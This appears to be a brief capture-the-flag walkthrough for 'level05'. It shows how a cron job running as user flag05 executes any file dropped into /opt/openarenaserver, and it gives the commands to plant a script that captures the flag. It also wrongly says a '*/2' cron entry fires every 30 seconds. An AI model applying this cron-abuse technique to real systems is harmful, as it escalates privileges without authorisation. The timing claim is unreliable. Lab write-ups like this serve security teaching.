1. Find command to see files with user flag05 permission

1 file : 

#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done


2. when connecting back from ssh, we get a clue : you've got mail

ls /*

shows a mail folder in /var

inside is a level05 file with a crontab instruction

*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

This means the prgm with user flag05 permission is called every 30 sec

3. Adding a file inside /opt/openarenaserver/ to get called by the cron job

echo "getflag > /var/tmp/flag05" > /opt/openarenaserver/getflag

4. cat the flag inside the tmp file

cat /var/tmp/flag05